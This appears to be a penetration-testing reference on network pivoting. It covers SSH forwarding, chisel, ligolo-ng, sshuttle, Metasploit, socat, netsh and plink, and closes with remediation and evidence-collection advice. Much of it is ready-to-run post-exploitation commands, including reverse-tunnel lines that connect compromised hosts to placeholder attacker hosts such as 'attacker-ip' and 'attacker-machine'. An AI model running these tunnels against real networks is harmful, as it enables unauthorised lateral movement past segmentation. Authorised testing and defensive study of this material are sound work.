# Network Pivoting Testing

## Overview
Network pivoting is the technique of using a compromised host as a relay to access other networks or systems that are not directly reachable from the attacker's position. It is a critical post-exploitation skill that enables lateral movement across network segments, bypassing firewalls, and reaching isolated internal resources through established footholds.

## Classification
- **CWE:** CWE-284 (Improper Access Control), CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints)
- **MITRE ATT&CK:** T1572 (Protocol Tunneling), T1090 (Proxy), T1090.001 (Internal Proxy), T1090.002 (External Proxy)
- **CVSS Base:** 6.5 - 9.0 (varies by network segmentation impact)

## Detection Methodology

### 1. Identify Pivoting Opportunities
After gaining initial access to a host, enumerate network position:
```bash
# Linux - identify interfaces and routes
ip addr show
ip route show
cat /etc/resolv.conf
arp -a
netstat -rn

# Windows - identify interfaces and routes
ipconfig /all
route print
arp -a
netstat -rn
Get-NetAdapter | Get-NetIPAddress
```

### 2. Discover Internal Networks
Identify reachable subnets from the compromised host:
```bash
# Ping sweep from pivot host
for i in $(seq 1 254); do ping -c 1 -W 1 10.10.10.$i &>/dev/null && echo "10.10.10.$i alive"; done

# Nmap from pivot host (if available)
nmap -sn 10.10.10.0/24

# ARP scan
arp-scan --localnet

# Windows - quick ping sweep
1..254 | ForEach-Object { Test-Connection -ComputerName "10.10.10.$_" -Count 1 -Quiet }
```

### 3. SSH Tunneling (Local Port Forward)
Forward a local port through the pivot host to a target:
```bash
# Forward local port 8080 to internal host 10.10.10.50:80
ssh -L 8080:10.10.10.50:80 user@pivot-host

# Forward with bind to all interfaces
ssh -L 0.0.0.0:8080:10.10.10.50:80 user@pivot-host

# Multiple port forwards in one session
ssh -L 3306:db-server:3306 -L 8080:web-server:80 user@pivot-host
```

### 4. SSH Dynamic Port Forwarding (SOCKS Proxy)
Create a SOCKS proxy through the pivot host:
```bash
# Create SOCKS4/5 proxy on local port 1080
ssh -D 1080 user@pivot-host

# Use with proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -Pn 10.10.10.50

# Use with curl
curl --socks5 127.0.0.1:1080 http://10.10.10.50

# Use with nmap via proxychains
proxychains nmap -sT -Pn -p 80,443,445,3389 10.10.10.0/24
```

### 5. SSH Remote Port Forwarding (Reverse Tunnel)
Expose a service on the pivot host back to the attacker:
```bash
# Make attacker's port 4444 available on pivot host
ssh -R 4444:127.0.0.1:4444 user@pivot-host

# Reverse SOCKS proxy
ssh -R 1080 user@attacker-machine
```

### 6. Double Pivoting (Chained Tunnels)
Pivot through multiple compromised hosts:
```bash
# First pivot: attacker -> host1
ssh -D 1080 user@host1

# Second pivot: through host1 -> host2
proxychains ssh -D 1081 user@host2

# Access target through double pivot
proxychains -f proxychains_chain.conf nmap -sT -Pn 172.16.0.0/24
```

## Tool Usage

### Chisel (HTTP Tunneling)
```bash
# On attacker (server mode)
chisel server --reverse --port 8000

# On pivot host (client - reverse SOCKS)
chisel client attacker-ip:8000 R:socks

# On pivot host (client - specific port forward)
chisel client attacker-ip:8000 R:8080:10.10.10.50:80

# Double pivot with chisel
# Attacker: chisel server --reverse --port 8000
# Host1:    chisel client attacker:8000 R:1080:socks
# Host1:    chisel server --port 9000 --socks5
# Host2:    chisel client host1:9000 R:1081:socks
```

### Ligolo-ng (TUN-based Pivoting)
```bash
# On attacker (proxy server)
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# On pivot host (agent)
ligolo-agent -connect attacker-ip:11601 -ignore-cert

# In ligolo proxy interface
>> session           # List sessions
>> ifconfig           # Show routes
>> start              # Start tunnel
>> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp  # Reverse port forward

# Add route on attacker
sudo ip route add 10.10.10.0/24 dev ligolo
```

### sshuttle (Transparent Proxy)
```bash
# Route all traffic for a subnet through pivot
sshuttle -r user@pivot-host 10.10.10.0/24

# Route multiple subnets
sshuttle -r user@pivot-host 10.10.10.0/24 172.16.0.0/16

# Exclude certain hosts
sshuttle -r user@pivot-host 10.10.10.0/24 -x 10.10.10.1

# With SSH key authentication
sshuttle -r user@pivot-host --ssh-cmd "ssh -i key.pem" 10.10.10.0/24
```

### Metasploit Pivoting
```bash
# After getting a meterpreter session
meterpreter> run autoroute -s 10.10.10.0/24
meterpreter> background

# Create SOCKS proxy
msf> use auxiliary/server/socks_proxy
msf> set SRVPORT 1080
msf> run -j

# Port forward through meterpreter
meterpreter> portfwd add -l 3389 -p 3389 -r 10.10.10.50
meterpreter> portfwd list
```

### socat (Port Relay)
```bash
# Simple TCP relay on pivot host
socat TCP-LISTEN:8080,fork TCP:10.10.10.50:80

# UDP relay
socat UDP-LISTEN:53,fork UDP:10.10.10.1:53

# Encrypted relay with SSL
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:10.10.10.50:80
```

### Netsh Port Forwarding (Windows)
```cmd
# Add port forward rule on Windows pivot
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.10.50

# List current forwards
netsh interface portproxy show all

# Remove forward
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

### plink (PuTTY CLI - Windows)
```cmd
# Local port forward
plink.exe -L 8080:10.10.10.50:80 user@pivot-host

# Dynamic SOCKS proxy
plink.exe -D 1080 user@pivot-host

# Reverse port forward
plink.exe -R 4444:127.0.0.1:4444 user@attacker
```

## Remediation
1. **Network segmentation** -- enforce strict VLAN/firewall rules between zones
2. **Egress filtering** -- restrict outbound connections from servers
3. **SSH hardening** -- disable TCP forwarding in sshd_config (`AllowTcpForwarding no`)
4. **Jump host architecture** -- use controlled bastion hosts with full logging
5. **Zero Trust networking** -- verify identity for every connection, not just perimeter
6. **Monitor lateral traffic** -- alert on unusual east-west traffic patterns
7. **Endpoint detection** -- detect tunneling tools (chisel, ligolo, socat) via EDR
8. **Port proxy auditing** -- regularly audit netsh portproxy and iptables rules
9. **DNS/HTTP tunnel detection** -- inspect for abnormal DNS or HTTP traffic patterns

## Evidence Collection
When documenting network pivoting findings:
- Network diagram showing pivot path and reachable subnets
- Screenshot of routing tables and interface configurations on each pivot host
- List of internal hosts/services discovered through pivoting
- Commands used and tunnel configurations established
- Firewall rules that failed to prevent pivoting
- Time-stamped logs showing the pivot chain progression
- Impact assessment of segmentation bypass
